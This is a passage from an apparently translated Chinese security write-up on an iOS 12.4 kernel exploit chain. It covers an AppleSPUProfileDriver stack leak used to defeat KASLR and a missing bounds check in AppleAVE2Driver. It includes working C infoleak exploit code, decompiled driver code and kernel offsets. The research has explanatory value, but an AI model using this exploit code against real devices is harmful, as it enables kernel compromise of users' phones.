class="number">0x90</span>]</span><br><span class="line">                CBZ             X8, branch_exit_stub</span><br><span class="line">                STR             WZR, [SP,#<span class="number">0x50</span>+var_48]</span><br><span class="line">                BL              _mach_absolute_time</span><br><span class="line">                MOV             X1, X0  ; <span class="type">unsigned</span> __int64</span><br><span class="line">                MOV             X0, X20 ; <span class="variable language_">this</span></span><br><span class="line">                BL              __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong <span class="type">long</span>)</span><br><span class="line">                STR             X0, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">                MOV             W8, #<span class="number">0x30CC</span></span><br><span class="line">                ADD             X0, X20, X8</span><br><span class="line">                BL              _OSIncrementAtomic</span><br><span class="line">                STR             W0, [SP,#<span class="number">0x50</span>+var_44]</span><br><span class="line">                LDR             X0, [X20,#<span class="number">0x90</span>]</span><br><span class="line">                LDR             X8, [X0]</span><br><span class="line">                LDRAA           X9, [X8,#<span class="number">0x90</span>]!</span><br><span class="line">                MOVK            X8, #<span class="number">0x911C</span>,LSL#<span class="number">48</span></span><br><span class="line">                ADD             X1, SP, #<span class="number">0x50</span>+var_48</span><br><span class="line">                MOV             W2, #<span class="number">0x30</span></span><br><span class="line">                BLRAA           X9, X8                        <span class="comment">// Call to IOSharedDataQueue::enqueue</span></span><br><span class="line"></span><br><span class="line">branch_exit_stub                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">38</span></span><br><span class="line">                MOV             X0, X19 ; lock</span><br><span class="line">                BL              _IORecursiveLockUnlock</span><br><span class="line">                LDUR            X8, [X29,#var_18]</span><br><span class="line">                ADRP            X9, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X9, [X9,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                <span class="built_in">CMP</span>             X9, X8</span><br><span class="line">                B.NE            branch_stack_chk_fail</span><br><span class="line">                MOV             W0, #<span class="number">0</span></span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                ADD             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                RETAB</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">branch_stack_chk_fail                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">9</span>C</span><br><span class="line">                BL              ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>可以看到32位值为0保存在<code>var_48</code>中，<code>OSIncrementAtomic</code>调用的结果保存在<code>var_44</code>中，<code>absolutetime_to_sputime</code>的返回值保存在<code>var_40</code>中，但是，还记得为<code>IOSharedDataQueue::enqueue</code>调用提供了<code>0x30</code>大小吗？这意味着任何为初始化的堆栈数据都将泄漏到<code>dataqueue</code>中，虽然<code>dataqueue</code>可能包含泄漏的数据，如果我们不能访问此数据，那将不会对安全产生任何影响。但是<code>IOSharedDataQueue</code>被签名成完全共享。让我们来看下<code>AppleSPUProfileDriverUserClient::clientMemoryForType</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *<span class="variable language_">this</span>, <span class="type">int</span> type, <span class="type">unsigned</span> <span class="type">int</span> *options, IOMemoryDescriptor **memory)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0xE00002C2</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !type )</span><br><span class="line">  &#123;</span><br><span class="line">    memDesc = AppleSPUProfileDriver::copyBuffer(<span class="variable language_">this</span>-&gt;provider);</span><br><span class="line">    *memory = memDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( memDesc )</span><br><span class="line">      ret = <span class="number">0</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ret = <span class="number">0xE00002D8</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  memDesc = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  <span class="keyword">if</span> ( memDesc )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(*memDesc + <span class="number">0x20</span>LL))();                   <span class="comment">// OSObject::retain</span></span><br><span class="line">    buf = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>IOConnectMapMemory64</code>可以将<code>IOShareDataQueue</code>映射到内存描述符中，该描述符包含排队的所有数据，包括泄漏的栈数据，为了确定这个漏洞，我们可以先看一个队列泄漏数据的例子：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> </span><br><span class="line">c0 <span class="number">5</span>a <span class="number">0</span>c <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> f0 <span class="number">42</span> <span class="number">00</span> e0 ff ff ff </span><br><span class="line"><span class="number">50</span> b4 d8 <span class="number">3</span>b e0 ff ff ff </span><br><span class="line"><span class="number">80</span> <span class="number">43</span> <span class="number">03</span> <span class="number">11</span> f0 ff ff ff </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>第一个<code>dword</code>是一个<code>IODataQueueEntry</code>结构的<code>size</code>字段(本例为<code>0x30</code>)，该字段位于队列中每个数据块的前面：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _IODataQueueEntry&#123;</span><br><span class="line">    <span class="built_in">UInt32</span>  size;</span><br><span class="line">    <span class="built_in">UInt8</span>   data[<span class="number">4</span>];</span><br><span class="line">&#125; IODataQueueEntry;</span><br></pre></td></tr></table></figure>

<p>然后我们第三行中看到<code>OSIncrementAtomic</code>的返回值<code>0x78</code>和<code>absolute_to_sputime</code>的值，数据之后是3个内核指针，它们是从堆栈中泄漏出来的。具体来说，我们对第三个指针<code>0xfffffff011034380</code>感兴趣。根据<code>iPhone 8，iOS 12.4</code>的测试，这个指针总是指向<code>__TEXT</code>段，因此通过计算指针偏移，我们可以推断出内核的偏移。信息泄漏的exploit如下所示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">uint64_t check_memmap_for_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line">    mach_vm_address_t map_addr = <span class="number">0</span>;</span><br><span class="line">    mach_vm_size_t map_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = IOConnectMapMemory64(ioconn, <span class="number">0</span>, mach_task_self(), &amp;map_addr, &amp;map_size, kIOMapAnywhere);</span><br><span class="line">    <span class="keyword">if</span> (ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;IOConnectMapMemory64 failed: %x %sn&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint32_t search_val = <span class="number">0xfffffff0</span>; <span class="comment">// Constant value of Kernel code segment higher 32bit addr</span></span><br><span class="line">    uint64_t start_addr = map_addr;</span><br><span class="line">    size_t search_size = map_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((start_addr = (uint64_t)memmem((<span class="keyword">const</span> <span class="type">void</span> *)start_addr, search_size, &amp;search_val, <span class="keyword">sizeof</span>(search_val))))</span><br><span class="line">    &#123;</span><br><span class="line">        uint64_t tmpcalc = *(uint64_t *)(start_addr - <span class="number">4</span>) - INFOLEAK_ADDR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// kaslr offset always be 0x1000 aligned</span></span><br><span class="line">        <span class="keyword">if</span> ((tmpcalc &amp; <span class="number">0xFFF</span>) == <span class="number">0x0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> tmpcalc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start_addr += <span class="keyword">sizeof</span>(search_val);</span><br><span class="line">        search_size = (uint64_t)map_addr + search_size - start_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mach_vm_offset_t get_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t scalarInput = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocte a new IOSharedDataQueue </span></span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kaslr_iter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!kaslr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// AppleSPUProfileDriverUserClient::extSignalBreak</span></span><br><span class="line">        <span class="comment">// Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack </span></span><br><span class="line">        IOConnectCallStructMethod(ioconn, <span class="number">11</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Map the IOSharedDataQueue and look for the leaked ptr </span></span><br><span class="line">        kaslr = check_memmap_for_kaslr(ioconn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kaslr_iter++ % <span class="number">5</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            scalarInput = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            scalarInput = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    scalarInput = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// Shutdown</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kaslr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击内核"><a href="#攻击内核" class="headerlink" title="攻击内核"></a>攻击内核</h3><p>最后一个漏洞是<code>AppleAVE2Driver</code>中缺少边界检查，<code>AppleAVE2</code>是iOS中的图形驱动程序，在本例中，可通过沙盒逃逸来访问<code>MIDIServer</code>。<code>userclient</code>公开了24个方法，这个漏洞存在于索引7的方法中：<code>_SetSessionSettings</code>，该方法获取一个大小为<code>0x108</code>的输入缓冲区，并通过<code>AppleAVE2Driver::GetIOSurfaceFromCSID</code>方法从输入缓冲区中提供的ID加载<code>IOSurface</code>，最后调用<code>AppleAVE2Driver::Enqueue</code>。具体来说，该方法将加载一个名为<code>InitInfoSurfaceld</code>或<code>InitInfoBuffer</code>的表：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !structIn-&gt;InitInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  initInfoSurfaceId = structIn-&gt;InitInfoSurfaceId;</span><br><span class="line">  <span class="keyword">if</span> ( initInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(<span class="variable language_">this</span>-&gt;provider, initInfoSurfaceId, <span class="variable language_">this</span>-&gt;task);</span><br><span class="line">    <span class="variable language_">this</span>-&gt;InitInfoBuffer = initInfoBuffer;</span><br><span class="line">    <span class="keyword">if</span> ( initInfoBuffer )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>AppleAVE2Driver::Enqueue</code>方法将在<code>IOSurface</code>上创建一个<code>IOSurfaceBufferMngr</code>实例：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">bufferMgr = operator new(<span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, <span class="number">0</span>LL, <span class="variable language_">this</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IOSurfaceBufferMngr::CreateBufferFromIOSurface(</span><br><span class="line">         bufferMgr,</span><br><span class="line">         service-&gt;InitInfoBuffer,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;iosurfaceRoot,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">128</span>],</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">136</span>],</span><br><span class="line">         <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap101[<span class="number">39</span>],</span><br><span class="line">         <span class="string">&quot;InitInfo&quot;</span>,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;gap3AF[<span class="number">49</span>],</span><br><span class="line">         <span class="number">0x1F4</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BD</span>LL;</span><br><span class="line">    v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr);</span><br><span class="line">    operator delete(v28);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( bufferMgr-&gt;size &lt; <span class="number">0x25DD0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buffMgrKernAddr = bufferMgr-&gt;kernelAddress;</span><br><span class="line">  <span class="keyword">if</span> ( !buffMgrKernAddr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>考虑到这个缓冲区中的数据(现在映射到<code>buffMgrKernAddr</code>)是由<code>userland</code>控制的，该方法将继续将缓冲区中的大块数据复制到<code>AVEClient*</code>对象中，现在将其命名为<code>currentClient</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">currentClient-&gt;unsigned2400 = *(buffMgrKernAddr + <span class="number">2008</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;unsigned2404, buffMgrKernAddr + <span class="number">2012</span>, <span class="number">0x2BE4</span>LL);</span><br><span class="line">  currentClient-&gt;oword5018 = *(buffMgrKernAddr + <span class="number">13296</span>);</span><br><span class="line">  currentClient-&gt;oword5008 = *(buffMgrKernAddr + <span class="number">13280</span>);</span><br><span class="line">  currentClient-&gt;oword4FF8 = *(buffMgrKernAddr + <span class="number">13264</span>);</span><br><span class="line">  currentClient-&gt;oword4FE8 = *(buffMgrKernAddr + <span class="number">13248</span>);</span><br><span class="line">  currentClient-&gt;oword5058 = *(buffMgrKernAddr + <span class="number">13360</span>);</span><br><span class="line">  currentClient-&gt;memoryInfoCnt2 = *(buffMgrKernAddr + <span class="number">0x3420</span>);</span><br><span class="line">  currentClient-&gt;oword5038 = *(buffMgrKernAddr + <span class="number">13328</span>);</span><br><span class="line">  currentClient-&gt;oword5028 = *(buffMgrKernAddr + <span class="number">13312</span>);</span><br><span class="line">  currentClient-&gt;oword5098 = *(buffMgrKernAddr + <span class="number">13424</span>);</span><br><span class="line">  currentClient-&gt;oword5088 = *(buffMgrKernAddr + <span class="number">13408</span>);</span><br><span class="line">  currentClient-&gt;oword5078 = *(buffMgrKernAddr + <span class="number">13392</span>);</span><br><span class="line">  currentClient-&gt;oword5068 = *(buffMgrKernAddr + <span class="number">13376</span>);</span><br><span class="line">  currentClient-&gt;oword50C8 = *(buffMgrKernAddr + <span class="number">13472</span>);</span><br><span class="line">  currentClient-&gt;oword50B8 = *(buffMgrKernAddr + <span class="number">13456</span>);</span><br><span class="line">  currentClient-&gt;oword50A8 = *(buffMgrKernAddr + <span class="number">13440</span>);</span><br><span class="line">  currentClient-&gt;qword50D8 = *(buffMgrKernAddr + <span class="number">13488</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br><span class="line">  memmove(&amp;currentClient-&gt;gap1C8C[<span class="number">0x5CC</span>], buffMgrKernAddr + <span class="number">1584</span>, <span class="number">0x1A8</span>LL);</span><br></pre></td></tr></table></figure>

<p>通过<code>AppleAVE2DriverUserClient::_ my_close</code>关闭<code>AppleAVE2Driver userclient</code>时，将调用一个名为<code>AppleAVE2Driver::AVE_DestroyContext</code>的函数，该函数位于该<code>userclient</code>关联的<code>AVEClient</code>对象上。<code>AVE_DestroyContext</code>在<code>AVEClient</code>中<code>MEMORY_INFO</code>结构上调用<code>AppleAVE2Driver::DeleteMemoryInfo</code>，并且在倒数第二步客户端的<code>MEMORY_INFO</code>结构数组上调用此函数，其数量由<code>memoryInfoCnt&#123;1,2&#125;</code>字段表示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">v73 = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v73 &lt;= currentClient-&gt;memoryInfoCnt2 )</span><br><span class="line">    v73 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v73 )</span><br><span class="line">  &#123;</span><br><span class="line">    iter1 = <span class="number">0</span>LL;</span><br><span class="line">    statsMapBufArr = currentClient-&gt;statsMapBufferArray;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      AppleAVE2Driver::DeleteMemoryInfo(<span class="variable language_">this</span>, statsMapBufArr);</span><br><span class="line">      ++iter1;</span><br><span class="line"></span><br><span class="line">      loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">      cnt2 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( loopMax &lt;= cnt2 )</span><br><span class="line">        loopMax = cnt2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        loopMax = loopMax;</span><br><span class="line"></span><br><span class="line">      statsMapBufArr += <span class="number">0x28</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( iter1 &lt; loopMax );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>_SetSessionSettings</code>中，对<code>memoryInfoCnt1</code>的值进行边界检查：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( currentClient-&gt;memoryInfoCnt1 &gt;= <span class="number">4</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  ret = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，没有检查<code>memoryInfoCnt2</code>的值，这里缺少检查，加上while循环中的逻辑，意味着如果提供足够大的<code>memoryInfoCnt2</code>值，循环将越界访问和调用<code>DeleteMemoryInfo</code>上的数据：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;  <span class="comment">// Take memoryInfoCnt1 (max 4), loopMax is &lt;=6</span></span><br><span class="line"></span><br><span class="line">cnt2 = currentClient-&gt;memoryInfoCnt2;         <span class="comment">// Take memoyInfoCnt2</span></span><br><span class="line"><span class="keyword">if</span> ( loopMax &lt;= cnt2 )                        <span class="comment">// if cnt2 is larger than loopMax...</span></span><br><span class="line">  loopMax = cnt2;                             <span class="comment">// update loopMax to the value of memoryInfoCnt2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  loopMax = loopMax;</span><br></pre></td></tr></table></figure>

<p>默认情况下，<code>statsMapBufferArray</code>中有5个<code>MEMORY_INFO</code>结构。由于每个大小为<code>0x28</code>，数组将占用<code>0xc8</code>字节。由于这个数组是在<code>AVEClient*</code>对象中内联的，当我们触发越界错误时，下一个<code>DeleteMemoryInfo</code>调用将使用<code>statsMapBufferArray</code>之后所有的数据。在我的<code>iPhone 8</code>的12.4内核上，这个数组的偏移量是<code>0x1b60</code>，也就是说第6项(第一个越界项)位于偏移量<code>0x1c28</code>处。</p>
<p>现在，还记得在<code>SetSessionSettings</code>中，如何将大块数据从用户控制的缓冲区复制到<code>AVEClient</code>对象中吗？恰好其中一个受控制缓冲区位于<code>statsMapBufferArray</code>字段之后!</p>
